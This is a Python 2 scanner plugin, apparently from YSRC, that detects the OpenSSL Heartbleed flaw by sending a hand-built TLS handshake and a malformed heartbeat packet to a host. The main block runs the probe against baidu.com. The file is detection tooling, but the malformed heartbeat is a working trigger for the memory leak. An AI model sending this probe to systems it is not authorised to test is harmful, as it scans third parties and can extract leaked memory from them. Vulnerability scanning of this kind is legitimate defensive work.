# coding:utf-8
import re
import urllib2

import struct
import socket
import time
import select

def request2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

client_key_exchange = request2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

malformed_heartbeat = request2bin('''
18 03 02 00 03
01 40 00
''')

def get_msg_from_socket(some_socket, msg_length, time_out=5):
    end_time = time.time() + time_out
    received_data = ''
    remaining_msg = msg_length
    while remaining_msg > 0:
        read_time = end_time - time.time()
        if read_time < 0:
            return None
        read_socket, write_socket, error_socket = select.select([some_socket], [], [], time_out)
        if some_socket in read_socket:
            data = some_socket.recv(remaining_msg)
            if not data:
                return None
            else:
                received_data += data
                remaining_msg -= len(data)
        else:
            pass
    return received_data
        
def recv_msg(a_socket):
    header = get_msg_from_socket(a_socket, 5)
    if header is None:
        return None, None, None
    message_type, message_version, message_length = struct.unpack('>BHH', header)
    message_payload = get_msg_from_socket(a_socket, message_length, 10)
    if message_payload is None:
        return None, None, None
    return message_type, message_version, message_payload

def send_n_catch_heartbeat(our_socket):
    our_socket.send(malformed_heartbeat)
    while True:
        content_type, content_version, content_payload = recv_msg(our_socket)
        if content_type is None:
            return False
        if content_type == 24:
            return True
        if content_type == 21:
            return False

def check_heardbeat(host='', port=0):
    local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    local_socket.connect((host, int(port)))
    local_socket.send(client_key_exchange)
    while True:
        type, version, payload = recv_msg(local_socket)
        if not type:
            return
        if type == 22 and ord(payload[0]) == 0x0E:
            break
    local_socket.send(malformed_heartbeat)
    return send_n_catch_heartbeat(local_socket)

def get_plugin_info():
    plugin_info = {
        "name":"OpenSSL心脏出血",
        "info":"可以提取部分心跳包获取内存中的敏感数据",
        "level":"高危",
        "type":"信息泄露",
        "author":"Nearg1e@YSRC",
        "source":1,
        "url":"http://www.freebuf.com/articles/network/32171.html",
        "keyword":"port:443"
    }
    return plugin_info

def check(host, port, timeout):
    info = ''
    try:
        if check_heardbeat(host=host, port=port):
            info = u'存在心脏出血漏洞'
            return info
    except Exception, e:
        pass

if __name__ == '__main__':
    print check('baidu.com', 443)
